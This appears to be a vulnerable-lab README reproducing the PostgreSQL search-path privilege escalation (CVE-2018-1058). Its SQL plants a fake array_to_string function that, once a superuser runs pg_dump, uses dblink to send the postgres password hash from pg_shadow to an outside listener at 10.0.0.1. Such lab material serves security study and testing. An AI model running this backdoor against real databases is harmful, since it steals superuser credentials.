# PostgreSQL Privilege Escalation (CVE-2018-1058)

[中文文档](README.zh-cn.md)

PostgreSQL is a powerful open-source relational database system. A logical error exists in versions 9.3 through 10, where superusers can unknowingly execute malicious code created by regular users, leading to unexpected operations.

References:

- https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058:_Protect_Your_Search_Path
- https://xianzhi.aliyun.com/forum/topic/2109

## Environment Setup

Execute the following command to start a vulnerable PostgreSQL server:

```
docker compose up -d
```

The server will start and listen on the default PostgreSQL port 5432.

## Vulnerability Reproduction

Following the second exploitation method from the references, we'll first connect to PostgreSQL as the regular user `vulhub:vulhub`:

```bash
psql --host your-ip --username vulhub
```

![](1.png)

Execute the following SQL statements and then exit:

```sql
CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$
    select dblink_connect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres'))); 
    SELECT pg_catalog.array_to_string($1,$2);
$$ LANGUAGE SQL VOLATILE;
```

Now, set up a listener on port 5433 at `10.0.0.1` to wait for the superuser to trigger our "backdoor".

(Simulating superuser actions) On the target machine, execute the `pg_dump` command as the superuser:

```bash
docker compose exec postgres pg_dump -U postgres -f evil.bak vulhub
```

This command will export the contents of the `vulhub` database. When executed, our "backdoor" is triggered, and sensitive information is received on the `10.0.0.1` machine:

![](2.png)

This is just one of several exploitation methods for this vulnerability. For more exploitation techniques, please refer to the articles in the References section.
